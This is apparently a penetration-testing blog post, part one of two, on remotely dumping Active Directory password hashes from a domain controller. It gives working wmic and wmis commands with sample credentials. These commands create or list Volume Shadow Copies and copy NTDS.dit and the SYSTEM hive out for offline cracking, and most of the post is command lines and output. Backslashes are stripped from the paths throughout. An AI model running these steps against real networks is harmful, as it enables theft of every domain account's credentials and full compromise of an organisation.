<div class="header">
  <h1>Volume Shadow Copy NTDS.dit Domain Hashes Remotely - Part1</h1>
  <h2></h2>
</div>
<div class="content">
  <blockquote>
<p>This and part 2 are mostly just an update to <a href="http://pauldotcom.com/2011/11/safely-dumping-hashes-from-liv.html">http://pauldotcom.com/2011/11/safely-dumping-hashes-from-liv.html</a> but without the need for VSSOwn, that and we are doing it remotely without the need for shell on the DC.</p>
</blockquote>

<p>Ever run into a Domain Controller that wasn&rsquo;t allowed to talk to the Internet, had insane AV and GPOs not allowing anyone to RDP in (Even Domain Admins) unless they provided some kind of voodo happy dance? Ya me neither, but here is how you can still dump domain hashes and hash history if you run into that case. Lets start</p>

<p>First authenticate to the domain controller and make sure you have a good working directory to use.</p>

<pre><code>net use \DC1 /user:DOMAINdomainadminsvc domainadminsvc123
dir \DC1C$
</code></pre>

<p>Alright, lets say &ldquo;TEMP&rdquo; is there and it&rsquo;s empty on the remote DC. The way we are going to run commands will not allow us to get results directly so we are going to use a temp file on the DC in C:TEMP where we already made sure is clear.</p>

<p>We are going to be using Volume Shadow Copies to pull the NTDS.dit file (Active Directory&rsquo;s DB much like Window&rsquo;s SAM file except that it stores the entire AD set of objects there), we also need the SYSTEM registry hive. You can get the SAM registry hive as well but that will only get local DC credentials.</p>

<p>So lets list the current volume shadow copies to see if we need to create one, from a Windows command prompt (or if you&rsquo;ve installed wmic for Linux via <a href="http://www.krenger.ch/blog/wmi-commands-from-linux/">http://www.krenger.ch/blog/wmi-commands-from-linux/</a> ) - this <em>IS</em> an interactive command so this won&rsquo;t work very nicely in a Meterpreter shell:</p>

<pre><code>C:temp&gt;wmic /node:DC1 /user:DOMAINdomainadminsvc /password:domainadminsvc123 process call create &quot;cmd /c vssadmin list shadows 2&gt;&amp;1 &gt; C:tempoutput.txt&quot;
Executing (Win32_Process)-&gt;Create()
Method execution successful.
Out Parameters:
instance of __PARAMETERS
{
        ProcessId = 7304;
        ReturnValue = 0;
};
</code></pre>

<p>To break down this command:</p>

<ul>
<li><p>wmic /node:DC1 - tells it to interact with the WMI API on DC1</p></li>

<li><p>/user:DOMAINdomainadminsvc /password:domainadminsvc123 - authentication</p></li>

<li><p>process call create - WMI speak for create a process</p></li>

<li><p>cmd /c - vssadmin doesn&rsquo;t operate outside of cmd for some reason&hellip;</p></li>

<li><p>vssadmin list shadows - List any shadow volumes that already exist</p></li>

<li><p>2&gt;&amp;1 &gt; C:tempoutput.txt - Take STDIN and STDERROR and throw it in a text file on DC1 C:TEMP. Make sure you specify full path because you will be executing from within C:WindowsSystem32 and its a pain to find anything in that directory. So if you just specify &gt; bob.txt you get to hunt in C:WindowsSystem32 or wherever WMI wants to execute you from for bob.txt</p></li>
</ul>

<p>Process starts and then you need to view the output file by either copying it down, type \DC1C$TEMPoutput.txt or mount the C drive as a network share. Either way you should either see something like this:</p>

<pre><code>C:temp&gt;type output.txt
vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2005 Microsoft Corp.

Contents of shadow copy set ID: {671090fd-0198}
   Contained 1 shadow copies at creation time: 5/31/2013 11:29:03 AM
      Shadow Copy ID: {0863e309}
         Original Volume: (C:)\?Volume{c44da10e-0154-11e1-b968-806e6f6e6963}
         Shadow Copy Volume: \?GLOBALROOTDeviceHarddiskVolumeShadowCopy1
         Originating Machine: wpad
         Service Machine: wpad
         Provider: 'Microsoft Software Shadow Copy provider 1.0'
         Type: ClientAccessibleWriters
         Attributes: Persistent, Client-accessible, No auto release, Differential, Auto recovered
</code></pre>

<p>or</p>

<pre><code>C:temp&gt;type output.txt
vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2005 Microsoft Corp.

No items found that satisfy the query
</code></pre>

<p>If there are no shadow copies or the ones there are too old (look at the creation time), you can create a shadow copy using the &lsquo;vssadmin create shadow /for=C: command. (This command only applies to Server OS (Win2k3/Win2k8) but since those are the only two that commonly have NTDS.dit files we don&rsquo;t have to remember this):</p>

<pre><code>C:temp&gt;wmic /node:DC1 /user:DOMAINdomainadminsvc /password:domainadminsvc123 process call create &quot;cmd /c vssadmin create shadow /for=C: 2&gt;&amp;1 &gt; C:tempoutput.txt&quot;
</code></pre>

<p>The other thing to keep in mind is that NTDS.dit isn&rsquo;t always on the main drive. It is commonly on a &ldquo;D&rdquo; drive for safety if a HDD goes bad or something. But it should always be in a folder called NTDS. (By default this is C:WindowsNTDS)</p>

<p>Next we just copy the files out of the shadow copies. First the SYSTEM hive:</p>

<pre><code>C:temp&gt;wmic /node:DC1 /user:DOMAINdomainadminsvc /password:domainadminsvc123 process call create &quot;cmd /c copy \?GLOBALROOTDeviceHarddiskVolumeShadowCopy1WindowsSystem32configSYSTEM C:tempSYSTEM.hive 2&gt;&amp;1 &gt; C:tempoutput.txt&quot;
</code></pre>

<p>Then the NTDS.dit (notice this one isn&rsquo;t in System32):</p>

<pre><code>C:temp&gt;wmic /node:DC1 /user:DOMAINdomainadminsvc /password:domainadminsvc123 process call create &quot;cmd /c copy \?GLOBALROOTDeviceHarddiskVolumeShadowCopy2WindowsNTDSNTDS.dit C:tempNTDS.dit 2&gt;&amp;1 &gt; C:tempoutput.txt&quot;
</code></pre>

<p>In Kali Linux you could use the WMIS package to do much the same thing:</p>

<pre><code>root@kali:~# wmis -U DOMAINdomainadminsvc%domainadminsvc123 //DC1 cmd.exe /c copy \?GLOBALROOTDeviceHarddiskVolumeShadowCopy2WindowsNTDSNTDS.dit C:tempNTDS.dit 2&gt;&amp;1 &gt; C:tempoutput.txt
NTSTATUS: NT_STATUS_OK - Success
</code></pre>

<p>Copy those files to your own system for offline extraction which I&rsquo;ll cover in part 2.</p>
